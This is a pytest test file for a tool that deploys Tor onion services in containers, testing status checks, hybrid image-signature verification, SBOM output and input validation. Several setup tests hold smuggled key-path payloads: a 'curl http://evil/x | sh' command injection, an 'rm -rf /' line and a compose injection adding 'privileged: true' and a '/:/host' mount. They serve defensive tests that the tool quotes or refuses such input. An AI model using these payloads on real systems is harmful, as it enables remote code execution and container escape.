        got = (tmp_path / name).read_text()
        assert got == expected, (
            f"{name} drifted from tests/golden_setup/{name}; regenerate the golden "
            "if the change is intended"
        )


# ─────────────────────────────────────────────────────────────────────────────
# status (docker/podman inspect + healthcheck mapping)
# ─────────────────────────────────────────────────────────────────────────────

def test_status_ready_maps_healthcheck_fields(hf, tmp_path, capsys, monkeypatch):
    os.chmod(tmp_path, 0o700)
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (
        {"State": {"Running": True, "Health": {"Status": "healthy"},
                   "StartedAt": "2026-01-01T00:00:00Z"},
         "RestartCount": 2}, None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_json", lambda c, a: {
        "tor_bootstrapped": True, "hidden_service_published": True,
        "vanguards": True, "reason": None,
        "services": [{"name": "app", "address": VECTOR_ONION, "published": True}]})
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: None)
    rc = hf.main(["status", "--container", "tor", "--keys", str(tmp_path), "--json"])
    assert rc == 0
    doc = json.loads(capsys.readouterr().out)
    assert doc["ready"] is True
    assert doc["tor_bootstrapped"] is True
    assert doc["vanguards"] is True
    assert doc["address"] == VECTOR_ONION
    assert doc["restarts"] == 2
    assert doc["dropped_mappings"] == []


def test_status_not_ready_exits_4(hf, tmp_path, capsys, monkeypatch):
    os.chmod(tmp_path, 0o700)
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (
        {"State": {"Running": True, "Health": {"Status": "starting"},
                   "StartedAt": "2026-01-01T00:00:00Z"}, "RestartCount": 0}, None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_json", lambda c, a: None)
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: None)
    rc = hf.main(["status", "--container", "tor", "--keys", str(tmp_path), "--json"])
    assert rc == hf.EXIT_NOT_READY
    assert json.loads(capsys.readouterr().out)["ready"] is False


def test_a_starting_engine_does_not_hold_back_a_ready_service(
        hf, tmp_path, capsys, monkeypatch):
    """Measured under Podman without a systemd user session: healthchecks run
    from systemd timers there, so the engine said "starting" for good while the
    service was ready, and `status` could never say ready. The probe `status`
    runs is the identical script, so it stands in until the engine has a
    result of its own."""
    os.chmod(tmp_path, 0o700)
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (
        {"State": {"Running": True, "Health": {"Status": "starting"}},
         "RestartCount": 0}, None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_json", lambda c, a: {
        "tor_bootstrapped": True, "hidden_service_published": True,
        "vanguards": True, "reason": None, "ready": True,
        "services": [{"name": "app", "address": VECTOR_ONION, "published": True}]})
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: None)
    rc = hf.main(["status", "--container", "tor", "--keys", str(tmp_path), "--json"])
    doc = json.loads(capsys.readouterr().out)
    assert rc == 0 and doc["ready"] is True, doc


def test_a_starting_engine_and_a_failing_probe_is_not_ready_and_says_why(
        hf, tmp_path, capsys, monkeypatch):
    os.chmod(tmp_path, 0o700)
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (
        {"State": {"Running": True, "Health": {"Status": "starting"}},
         "RestartCount": 0}, None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_json", lambda c, a: {
        "ready": False, "reason": "bootstrap not at 100%",
        "services": [{"name": "app", "address": VECTOR_ONION, "published": True}]})
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: None)
    rc = hf.main(["status", "--container", "tor", "--keys", str(tmp_path), "--json"])
    doc = json.loads(capsys.readouterr().out)
    assert rc == hf.EXIT_NOT_READY and doc["reason"] == "bootstrap not at 100%"


def test_status_names_an_inconsistent_key_set_as_the_reason(hf, tmp_path, capsys,
                                                            monkeypatch):
    """Waiting never fixes a hostname that disagrees with its key, so the reason
    must say so rather than "not published yet"."""
    keys = _inconsistent_volume(tmp_path)
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (
        {"State": {"Running": True, "Health": {"Status": "healthy"}},
         "RestartCount": 0}, None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_json", lambda c, a: None)
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: None)
    rc = hf.main(["status", "--container", "tor", "--keys", str(keys), "--json"])
    doc = json.loads(capsys.readouterr().out)
    assert rc == hf.EXIT_NOT_READY
    assert "restore the whole directory" in doc["reason"]


def test_status_is_ready_under_rootless_podman(hf, tmp_path, capsys, monkeypatch):
    """Measured live with podman-compose.yml: the service was up with 11
    established introduction points, and `status` could never say ready.
    Three causes, all reproduced here: the healthcheck was run as root (who
    cannot reach the socket without DAC_OVERRIDE), the host cannot read the
    subuid-owned key directory so every address was None, and Podman had no
    health status because no healthcheck had run."""
    keys = tmp_path / "tor-keys"
    (keys / "app").mkdir(parents=True)
    os.chmod(keys / "app", 0o000)              # the subuid-owned directory
    asked = []

    def exec_json(container, argv):
        asked.append(argv)
        if argv[:2] != ["su-exec", "tor"]:
            return {"ready": False, "reason": "cannot reach control socket: [Errno 13]"}
        return {"ready": True, "reason": None, "tor_bootstrapped": True,
                "hidden_service_published": True, "vanguards": True,
                "services": [{"name": "app", "address": VECTOR_ONION,
                              "published": True}]}

    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (
        {"State": {"Running": True}, "RestartCount": 0}, None))    # no Health at all
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_json", exec_json)
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: None)
    try:
        rc = hf.main(["status", "--container", "tor", "--keys", str(keys), "--json"])
    finally:
        os.chmod(keys / "app", 0o700)
    doc = json.loads(capsys.readouterr().out)
    assert asked[0][:2] == ["su-exec", "tor"]
    assert doc["address"] == VECTOR_ONION
    assert rc == 0 and doc["ready"] is True, doc


def test_an_engine_health_status_is_still_believed_over_the_probe(hf, tmp_path,
                                                                  capsys, monkeypatch):
    """The fallback is for NO status. An engine that says unhealthy is not
    overruled by a single probe that happened to pass."""
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (
        {"State": {"Running": True, "Health": {"Status": "unhealthy"}},
         "RestartCount": 0}, None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_json", lambda c, a: {
        "ready": True, "reason": None, "hidden_service_published": True,
        "services": [{"name": "app", "address": VECTOR_ONION, "published": True}]})
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: None)
    rc = hf.main(["status", "--container", "tor", "--keys", str(tmp_path), "--json"])
    doc = json.loads(capsys.readouterr().out)
    assert rc == hf.EXIT_NOT_READY and doc["ready"] is False


def test_a_stale_healthy_engine_does_not_outvote_a_failing_probe(hf, tmp_path, capsys,
                                                                  monkeypatch):
    """Docker re-runs the healthcheck every 60s and needs three failures to say
    unhealthy, so "healthy" can be minutes old. With Vanguards dead, `status`
    answered ready: true beside a reason saying the addon was NOT running."""
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    (tmp_path / "app.onion").write_text(VECTOR_ONION + "\n")
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (
        {"State": {"Running": True, "Health": {"Status": "healthy"}},
         "RestartCount": 0}, None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_json", lambda c, a: {
        "ready": False, "vanguards": False, "hidden_service_published": True,
        "reason": "Tor is serving but the Vanguards addon is NOT running",
        "services": [{"name": "app", "address": VECTOR_ONION, "published": True}]})
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: None)
    rc = hf.main(["status", "--container", "tor", "--keys", str(tmp_path), "--json"])
    doc = json.loads(capsys.readouterr().out)
    assert rc == hf.EXIT_NOT_READY and doc["ready"] is False
    assert "Vanguards" in doc["reason"]


def test_no_opinion_at_all_is_not_ready(hf, tmp_path, capsys, monkeypatch):
    _write_service(tmp_path, "app", VECTOR_PUB_HEX, VECTOR_ONION)
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (
        {"State": {"Running": True}, "RestartCount": 0}, None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_json", lambda c, a: None)
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: None)
    rc = hf.main(["status", "--container", "tor", "--keys", str(tmp_path), "--json"])
    assert rc == hf.EXIT_NOT_READY


def test_status_surfaces_dropped_mappings(hf, tmp_path, capsys, monkeypatch):
    """A mapping that never made it into the torrc must be visible in status."""
    os.chmod(tmp_path, 0o700)
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (
        {"State": {"Running": True, "Health": {"Status": "healthy"},
                   "StartedAt": "x"}, "RestartCount": 0}, None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_docker_exec_json", lambda c, a: None)
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a:
                        "BAD_TOR_SERVICE_HOSTS: no valid port mappings; service dropped\n")
    rc = hf.main(["status", "--container", "tor", "--keys", str(tmp_path), "--json"])
    assert rc == hf.EXIT_NOT_READY
    doc = json.loads(capsys.readouterr().out)
    assert doc["dropped_mappings"] == [
        "BAD_TOR_SERVICE_HOSTS: no valid port mappings; service dropped"]


def test_status_uninspectable_container_exits_2(hf, tmp_path, capsys, monkeypatch):
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (None, "not found"))
    rc = hf.main(["status", "--container", "nope", "--keys", str(tmp_path), "--json"])
    assert rc == hf.EXIT_USAGE
    assert json.loads(capsys.readouterr().out)["running"] is False


def test_engine_override(hf, monkeypatch):
    monkeypatch.setenv("HIDDENFORGE_ENGINE", "podman")
    assert hf._engine() == "podman"
    monkeypatch.setenv("HIDDENFORGE_ENGINE", "docker")
    assert hf._engine() == "docker"
    monkeypatch.delenv("HIDDENFORGE_ENGINE")
    assert hf._engine() in ("docker", "podman", None)


# ─────────────────────────────────────────────────────────────────────────────
# verify-image / sbom
# ─────────────────────────────────────────────────────────────────────────────

def _sigdir(tmp_path, digest="sha256:" + "ab" * 32):
    d = tmp_path / "sig"
    d.mkdir()
    (d / "hiddenforge.digest").write_text(digest)
    (d / "allowed-signers").write_text("x")
    (d / "hiddenforge.digest.sig").write_text("x")
    (d / "sambent-mldsa.pub").write_text("x")
    (d / "hiddenforge.digest.mldsa").write_text("x")
    return d


def test_verify_image_ok(hf, tmp_path, capsys, monkeypatch):
    d = _sigdir(tmp_path)
    monkeypatch.setattr(hf, "_resolve_registry_digest", lambda i: ("sha256:" + "ab" * 32, None))
    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda *a: (True, "Good"))
    monkeypatch.setattr(hf, "_verify_mldsa_signature", lambda *a: (True, "ok"))
    rc = hf.main(["verify-image", "example/img:1", "--sigdir", str(d), "--json"])
    assert rc == 0
    doc = json.loads(capsys.readouterr().out)
    assert doc["digest_match"] is True and doc["ssh_fido2"] is True
    assert doc["trust_anchor"] == "pinned"


def test_verify_image_digest_mismatch_fails(hf, tmp_path, capsys, monkeypatch):
    d = _sigdir(tmp_path)
    monkeypatch.setattr(hf, "_resolve_registry_digest", lambda i: ("sha256:deadbeef", None))
    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda *a: (True, "Good"))
    monkeypatch.setattr(hf, "_verify_mldsa_signature", lambda *a: (None, "n/a"))
    rc = hf.main(["verify-image", "example/img:1", "--sigdir", str(d), "--json"])
    assert rc == hf.EXIT_FAIL
    doc = json.loads(capsys.readouterr().out)
    assert doc["digest_match"] is False
    assert any("registry" in f for f in doc["failures"])


def test_verify_image_bad_sigdir_exit_2(hf, tmp_path, capsys):
    rc = hf.main(["verify-image", "--sigdir", str(tmp_path / "nope"), "--json"])
    assert rc == hf.EXIT_USAGE


def test_verify_image_skip_registry(hf, tmp_path, capsys, monkeypatch):
    d = _sigdir(tmp_path)
    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda *a: (True, "Good"))
    monkeypatch.setattr(hf, "_verify_mldsa_signature", lambda *a: (True, "ok"))
    rc = hf.main(["verify-image", "--sigdir", str(d), "--skip-registry", "--json"])
    assert rc == 0
    doc = json.loads(capsys.readouterr().out)
    assert doc["digest_match"] is None


def test_sbom_writes_normalised_spdx(hf, tmp_path, capsys, monkeypatch):
    import subprocess as sp
    fake = {"packages": [{"name": "a"}, {"name": "b"}],
            "creationInfo": {"created": "2020-01-01T00:00:00Z"},
            "documentNamespace": "random"}
    monkeypatch.setattr(hf, "_engine", lambda: "docker")
    monkeypatch.setattr(hf, "_run", lambda cmd, **kw: sp.CompletedProcess(
        cmd, 0, json.dumps(fake), ""))
    out = tmp_path / "sbom.json"
    rc = hf.main(["sbom", "--image", "example/img:1", "--out", str(out), "--json"])
    assert rc == 0
    doc = json.loads(capsys.readouterr().out)
    assert doc["packages"] == 2
    written = json.loads(out.read_text())
    assert written["documentNamespace"] == "https://sambent.dev/sbom/hiddenforge"
    assert "created" not in written["creationInfo"]


def test_sbom_zero_packages_fails(hf, tmp_path, capsys, monkeypatch):
    import subprocess as sp
    monkeypatch.setattr(hf, "_engine", lambda: "docker")
    monkeypatch.setattr(hf, "_run", lambda cmd, **kw: sp.CompletedProcess(
        cmd, 0, json.dumps({"packages": []}), ""))
    rc = hf.main(["sbom", "--out", str(tmp_path / "s.json"), "--json"])
    assert rc == hf.EXIT_FAIL


def test_run_times_out_instead_of_hanging(hf):
    proc = hf._run(["sleep", "30"], timeout=1)
    assert proc.returncode == 124
    assert "timed out" in proc.stderr


def test_write_text_nofollow_refuses_symlink_target(hf, tmp_path):
    """A symlink planted at an output path must not have its target truncated."""
    target = tmp_path / "target"
    target.write_text("original")
    link = tmp_path / "link"
    link.symlink_to(target)
    with pytest.raises(OSError):
        hf._write_text_nofollow(link, "overwrite")
    assert target.read_text() == "original"


def test_write_text_nofollow_sets_mode(hf, tmp_path):
    p = tmp_path / "f"
    hf._write_text_nofollow(p, "x", 0o755)
    assert p.read_text() == "x"
    assert stat.S_IMODE(os.stat(p).st_mode) == 0o755


def test_harden_streams_reconfigures_both(hf, monkeypatch):
    calls = []

    class S:
        def reconfigure(self, **kw):
            calls.append(kw)

    monkeypatch.setattr(hf.sys, "stdout", S())
    monkeypatch.setattr(hf.sys, "stderr", S())
    hf._harden_streams()
    assert calls == [{"errors": "backslashreplace"}, {"errors": "backslashreplace"}]


def test_harden_streams_tolerates_streams_without_reconfigure(hf, monkeypatch):
    monkeypatch.setattr(hf.sys, "stdout", object())
    monkeypatch.setattr(hf.sys, "stderr", object())
    hf._harden_streams()   # must not raise


def test_aead_preferred_reports_aead(hf, monkeypatch):
    import subprocess as sp
    monkeypatch.setattr(hf.subprocess, "run",
                        lambda cmd, **kw: sp.CompletedProcess(cmd, 0, b"CIPHERTEXT", b""))
    data, mode = hf._encrypt_bytes("gpg", b"secret", "pw")
    assert data == b"CIPHERTEXT" and mode == "aead"


def test_aead_fallback_warns_and_reports_cfb(hf, capsys, monkeypatch):
    """A CFB+MDC downgrade must not happen silently."""
    import subprocess as sp

    def fake_run(cmd, **kw):
        if "--force-aead" in cmd:
            return sp.CompletedProcess(cmd, 2, b"", b'gpg: invalid option "--force-aead"')
        return sp.CompletedProcess(cmd, 0, b"CIPHERTEXT", b"")

    monkeypatch.setattr(hf.subprocess, "run", fake_run)
    data, mode = hf._encrypt_bytes("gpg", b"secret", "pw")
    assert data == b"CIPHERTEXT" and mode == "cfb"
    assert "NOT AEAD" in capsys.readouterr().err


def test_require_aead_refuses_the_fallback(hf, monkeypatch):
    """--require-aead turns the downgrade into a hard error."""
    import subprocess as sp

    def fake_run(cmd, **kw):
        if "--force-aead" in cmd:
            return sp.CompletedProcess(cmd, 2, b"", b'gpg: invalid option "--force-aead"')
        return sp.CompletedProcess(cmd, 0, b"CIPHERTEXT", b"")

    monkeypatch.setattr(hf.subprocess, "run", fake_run)
    with pytest.raises(ValueError, match="require-aead"):
        hf._encrypt_bytes("gpg", b"secret", "pw", require_aead=True)


def test_age_paths_fail_cleanly_not_silently(hf, monkeypatch):
    """age cannot be used with a passphrase file, and needs a real TTY."""
    with pytest.raises(ValueError, match="age does not use --passphrase-file"):
        hf._encrypt_bytes("age", b"x", "pw")
    monkeypatch.setattr(sys, "stdin", type("S", (), {"isatty": lambda self: False})())
    with pytest.raises(ValueError, match="interactive TTY"):
        hf._encrypt_bytes("age", b"x", None)
    with pytest.raises(ValueError, match="interactive TTY"):
        hf._decrypt_bytes("age", b"x", None)


def test_no_tool_error_hints_host_when_in_container(hf, monkeypatch):
    monkeypatch.setattr(hf, "_in_container", lambda: True)
    assert "HOST" in hf._no_tool_error()
    monkeypatch.setattr(hf, "_in_container", lambda: False)
    assert "HOST" not in hf._no_tool_error()


def test_exit_codes_are_documented(hf):
    m = hf.build_manifest()
    for code in ("0", "1", "2", "3", "4", "130"):
        assert code in m["exit_codes"]
    assert m["exit_codes"]["4"].startswith("not ready")


# ─────────────────────────────────────────────────────────────────────────────
# verify-image: half a hybrid signature is not a verified image
# ─────────────────────────────────────────────────────────────────────────────

DIGEST = b"sha256:" + b"a" * 64 + b"\n"


def _signature_set(tmp_path, *, pub=True, sig=True):
    d = tmp_path / "signatures"
    d.mkdir()
    (d / "hiddenforge.digest").write_bytes(DIGEST)
    (d / "allowed-signers").write_text("sam@sambent.com ssh-ed25519 AAAA\n")
    (d / "hiddenforge.digest.sig").write_text("-----BEGIN SSH SIGNATURE-----\n")
    if pub:
        # The real, pinned key: a stand-in would now be refused for not being it.
        shutil.copy(REPO / "signatures" / "sambent-mldsa.pub", d / "sambent-mldsa.pub")
    if sig:
        # Well-formed (pqsign's magic, the FIPS 204 length) but not a valid
        # signature over anything.
        (d / "hiddenforge.digest.mldsa").write_bytes(b"PQSIGN_MLDSA65_G" + b"\x00" * 3309)
    return d


def test_a_stripped_mldsa_public_key_is_a_failure_not_a_shrug(hf, tmp_path):
    """The signature is one half of a hybrid scheme. Treating a missing half as
    "nothing to report" lets an attacker downgrade it to a single classical
    signature by deleting one file, while the tool still prints VERIFIED."""
    sigdir = _signature_set(tmp_path, pub=False)
    verdict, detail = hf._verify_mldsa_signature(sigdir, DIGEST)
    assert verdict is False
    assert "has been altered" in detail


def test_a_stripped_mldsa_signature_is_a_failure_too(hf, tmp_path):
    sigdir = _signature_set(tmp_path, sig=False)
    verdict, detail = hf._verify_mldsa_signature(sigdir, DIGEST)
    assert verdict is False
    assert "has been altered" in detail


def test_a_signature_set_with_no_post_quantum_half_is_not_checked(hf, tmp_path):
    """An older set that never had one. Not a failure, but not silently fine
    either: the caller is told it was not checked."""
    sigdir = _signature_set(tmp_path, pub=False, sig=False)
    verdict, detail = hf._verify_mldsa_signature(sigdir, DIGEST)
    assert verdict is None
    assert "carries no ML-DSA signature" in detail


def test_a_missing_verifier_is_reported_as_not_checked(hf, tmp_path, monkeypatch):
    sigdir = _signature_set(tmp_path)
    monkeypatch.setattr(hf.shutil, "which",
                        lambda name: None if name == "pqsign" else "/usr/bin/" + name)
    monkeypatch.setattr(hf, "_openssl_mldsa", lambda level: (False, "OpenSSL 3.0.13"))
    verdict, detail = hf._verify_mldsa_signature(sigdir, DIGEST)
    assert verdict is None
    assert "NOT checked" in detail
    assert "OpenSSL 3.0.13 cannot do ML-DSA-65" in detail


def test_an_unchecked_half_never_prints_a_bare_verified(hf, tmp_path, monkeypatch,
                                                        capsys):
    """The one line an operator reads before trusting an image. "VERIFIED" must
    mean both halves were checked."""
    sigdir = _signature_set(tmp_path, pub=False, sig=False)
    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda *a, **kw: (True, "ok"))
    rc = hf.main(["verify-image", "example.com/x:1", "--sigdir", str(sigdir),
                  "--skip-registry", "--allow-classical-only"])
    out = capsys.readouterr().out
    assert rc == 0
    assert "VERIFIED, BUT NOT COMPLETELY" in out
    assert "carries no ML-DSA signature" in out


def test_an_unchecked_half_is_refused_unless_explicitly_accepted(hf, tmp_path,
                                                                 monkeypatch, capsys):
    """Exit status is what a deploy script tests. Deleting both ML-DSA files used
    to leave it at 0, which reduced the hybrid scheme to one classical signature
    for every caller that did not also parse the JSON."""
    sigdir = _signature_set(tmp_path, pub=False, sig=False)
    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda *a, **kw: (True, "ok"))
    rc = hf.main(["verify-image", "example.com/x:1", "--sigdir", str(sigdir),
                  "--skip-registry"])
    out = capsys.readouterr().out
    assert rc == hf.EXIT_FAIL
    assert "NOT VERIFIED" in out and "--allow-classical-only" in out


def test_a_fully_checked_image_says_verified_and_nothing_else(hf, tmp_path,
                                                              monkeypatch, capsys):
    """Guard against 'fixing' the above by qualifying every verdict."""
    sigdir = _signature_set(tmp_path)
    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda *a, **kw: (True, "ok"))
    monkeypatch.setattr(hf, "_verify_mldsa_signature", lambda *a: (True, "ok"))
    monkeypatch.setattr(hf, "_resolve_registry_digest",
                        lambda i: (DIGEST.decode().strip(), None))
    rc = hf.main(["verify-image", "example.com/x:1", "--sigdir", str(sigdir)])
    lines = capsys.readouterr().out.strip().splitlines()
    assert rc == 0
    assert lines[-1] == "VERIFIED"


def test_skipping_the_registry_is_never_reported_as_complete(hf, tmp_path,
                                                             monkeypatch, capsys):
    """--skip-registry checks the signatures but never that the image in the
    registry is the one they cover, so the answer is qualified, not bare."""
    sigdir = _signature_set(tmp_path)
    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda *a, **kw: (True, "ok"))
    monkeypatch.setattr(hf, "_verify_mldsa_signature", lambda *a: (True, "ok"))
    rc = hf.main(["verify-image", "example.com/x:1", "--sigdir", str(sigdir),
                  "--skip-registry", "--json"])
    doc = json.loads(capsys.readouterr().out)
    assert rc == 0 and doc["ok"] is True and doc["complete"] is False
    assert any("--skip-registry" in u for u in doc["unchecked"])


# ─────────────────────────────────────────────────────────────────────────────
# setup: the key path lands in a compose file and a 0755 shell script
# ─────────────────────────────────────────────────────────────────────────────
#
# `--image` and `--container` were validated and `--keys` was not, and `setup` is
# the machine-facing adoption path: docs/INTEGRATION.md describes programs calling
# it, so the value need not have been typed by the person who runs the result.

def _yaml_or_fail():
    """PyYAML, or a failure -- never a skip.

    These two tests are the whole proof that a crafted `--keys` or `--container`
    cannot smuggle `privileged: true` or `/:/host` into the fragment the operator
    merges into their stack, and the only way to ask that question is to PARSE
    the output. They used `pytest.importorskip`, so on a machine without PyYAML
    they reported green while checking nothing.

    That was not hypothetical. PyYAML was missing from requirements-ci, the CI
    unit job skipped both, and the mutation spot-check caught it: the
    container-escape mutation came back SURVIVED in CI and killed locally. A
    guard that disappears when a dependency is absent is not a guard, so the
    dependency is now pinned in requirements-ci.txt and its absence is an error.
    """
    try:
        import yaml
    except ImportError as exc:      # pragma: no cover - the point is it is loud
        raise AssertionError(
            "PyYAML is required to verify that the generated compose fragment "
            "cannot be made to open a second key. Refusing to skip a "
            "container-escape guard: pip install -r requirements-ci.txt"
        ) from exc
    return yaml


def test_a_key_path_cannot_open_a_second_compose_key(hf):
    """Reproduced before this was written: a crafted --keys produced a fragment
    with `privileged: true` and `/:/host` in volumes -- a container escape,
    written into a file the operator merges with their own compose.yml."""
    yaml = _yaml_or_fail()
    evil = ("/srv/keys:/var/lib/tor/hidden_service\n      - /:/host\n"
            "    privileged: true\n    x: y")
    frag = hf.render_compose_fragment({"app": ["80:127.0.0.1:8080"]}, "img:1",
                                      evil, "tor")
    svc = yaml.safe_load(frag)["services"]["tor"]
    assert svc.get("privileged") is None
    assert len(svc["volumes"]) == 1, svc["volumes"]
    assert "/host" not in svc["volumes"][0].split(":")[-1]


def test_a_key_path_cannot_inject_a_command_into_deploy_sh(hf):
    """deploy.sh is written 0755 and the README tells the operator to run it."""
    evil = '/srv/keys"; curl http://evil/x | sh; echo "'
    out = hf.render_deploy_sh({"app": ["80:127.0.0.1:8080"]}, evil, "tor")
    for line in out.splitlines():
        stripped = line.strip()
        if stripped.startswith(("mkdir", "chmod")):
            # The payload may appear, but only inside single quotes as data.
            assert stripped.count("'") >= 2, stripped
            assert not stripped.endswith("| sh; echo \"\""), stripped


def test_a_control_character_in_the_key_path_is_refused(hf):
    """Quoting is the fix; this is the second half. A path carrying a newline is
    not a path anyone meant to type, and refusing it keeps the generated files
    readable as well as safe."""
    with pytest.raises(ValueError, match="control character"):
        hf.validate_keys_dir("/srv/keys\n      - /:/host")
    with pytest.raises(ValueError, match="control character"):
        hf.validate_keys_dir("/srv/keys\x00")
    with pytest.raises(ValueError):
        hf.validate_keys_dir("")


def test_a_newline_in_the_key_path_adds_a_line_but_not_a_command(hf):
    """The validator refuses this, so nothing production renders can reach here.

    It is written down because the fuzz target asserted the opposite and crashed
    on its second input: it compared LINE COUNTS, and a newline inside
    `shlex.quote`'s single quotes adds a line while adding nothing executable.
    The property that actually matters is that the script's WORDS do not change,
    which is what `fuzz/fuzz_parsers.py` now asserts and what this pins down by
    hand for the payload that exposed it.
    """
    services = {"app": ["80:127.0.0.1:8080"]}
    benign = hf.render_deploy_sh(services, "/keys", "tor")
    for payload in ("\n", "/k\n; curl http://evil/x | sh\n", "/k\nrm -rf /"):
        with pytest.raises(ValueError, match="control character"):
            hf.validate_keys_dir(payload)
        rendered = hf.render_deploy_sh(services, payload, "tor")
        assert len(rendered.splitlines()) > len(benign.splitlines())
        got = shlex.split(rendered, comments=True)
        want = shlex.split(benign, comments=True)
        assert len(got) == len(want), (payload, len(want), len(got))
        for got_word, want_word in zip(got, want, strict=True):
            assert got_word == want_word or "/keys" in want_word, (
                payload, want_word, got_word)
        # And the result is still one syntactically valid script.
        proc = subprocess.run(["bash", "-n", "-"], input=rendered, text=True,
                              capture_output=True, check=False, timeout=30)
        assert proc.returncode == 0, proc.stderr


def test_an_ordinary_key_path_is_accepted_unchanged(hf):
    """Guard against 'fixing' this by refusing paths people actually use."""
    for good in ("./tor-keys", "/srv/onions/keys", "/mnt/My Keys/tor",
                 "../shared/keys"):
        assert hf.validate_keys_dir(good) == good


def test_setup_refuses_an_injectable_key_path(hf, tmp_path, capsys):
    rc = hf.main(["setup", "--backend", "web:80", "--name", "blog",
                  "--keys", "/srv/k\n    privileged: true", "-o", str(tmp_path),
                  "--json"])
    capsys.readouterr()
    assert rc != 0
    assert not (tmp_path / "compose.service.yml").exists()


# ─────────────────────────────────────────────────────────────────────────────
# doctor: the capability requirement depends on the runtime
# ─────────────────────────────────────────────────────────────────────────────

def _doctor_checks(hf, monkeypatch, capsys, cap_add, rootless):
    info = {"HostConfig": {"CapDrop": ["ALL"], "CapAdd": list(cap_add),
                           "SecurityOpt": ["no-new-privileges:true"],
                           "ReadonlyRootfs": True, "PidsLimit": 128},
            "State": {"Running": True, "Health": {"Status": "healthy"}},
            "Config": {"Image": "img"}}
    monkeypatch.setattr(hf, "_docker_inspect", lambda c: (info, None))
    monkeypatch.setattr(hf, "_resolve_container", lambda c: "cid")
    monkeypatch.setattr(hf, "_engine", lambda: "podman" if rootless else "docker")
    monkeypatch.setattr(hf, "_is_rootless", lambda: rootless)
    monkeypatch.setattr(hf, "_docker_exec_json", lambda c, a: None)
    monkeypatch.setattr(hf, "_docker_exec_text", lambda c, a: None)
    monkeypatch.setattr(hf, "_run", lambda cmd, **kw: subprocess.CompletedProcess(
        cmd, 1, "", ""))
    hf.main(["doctor", "--container", "tor", "--keys", "/nonexistent", "--json"])
    doc = json.loads(capsys.readouterr().out)
    return {c["check"]: c for c in doc["checks"]}


def test_doctor_does_not_fail_the_shipped_podman_capability_set(hf, monkeypatch,
                                                                capsys):
    """podman-compose.yml grants three capabilities, not five, because under
    rootless Podman container root maps to the invoking host user and the bind
    mount is already writable. `doctor` demanded all five on every runtime, so it
    reported FAILED for a container started from this project's own compose file,
    on the runtime the deployed instance uses. A check that fails on the
    recommended configuration teaches operators to ignore it."""
    checks = _doctor_checks(hf, monkeypatch, capsys,
                            ["CHOWN", "SETUID", "SETGID"], rootless=True)
    assert checks["cap_add includes every required capability"]["ok"] is True


def test_doctor_still_demands_all_five_under_rootful_docker(hf, monkeypatch, capsys):
    """The other half. Rootful Docker genuinely needs DAC_OVERRIDE and FOWNER to
    prepare a host-owned key volume, and a missing one is a container that cannot
    start its services."""
    checks = _doctor_checks(hf, monkeypatch, capsys,
                            ["CHOWN", "SETUID", "SETGID"], rootless=False)
    check = checks["cap_add includes every required capability"]
    assert check["ok"] is False
    assert "DAC_OVERRIDE" in check["detail"] and "FOWNER" in check["detail"]


def test_doctor_still_refuses_capabilities_outside_the_ceiling(hf, monkeypatch,
                                                               capsys):
    """Rootless does not mean anything goes: a capability nobody asked for is a
    finding on either runtime."""
    for rootless in (True, False):
        checks = _doctor_checks(hf, monkeypatch, capsys,
                                ["CHOWN", "SETUID", "SETGID", "SYS_ADMIN"],
                                rootless=rootless)
        check = checks["cap_add stays within the allowed set"]
        assert check["ok"] is False, rootless
        assert "SYS_ADMIN" in check["detail"]


def test_rootlessness_is_asked_not_assumed(hf, monkeypatch):
    """And a query that cannot answer leaves the strict requirement in force, so
    a broken engine can only make doctor stricter."""
    monkeypatch.setattr(hf, "_engine", lambda: "podman")
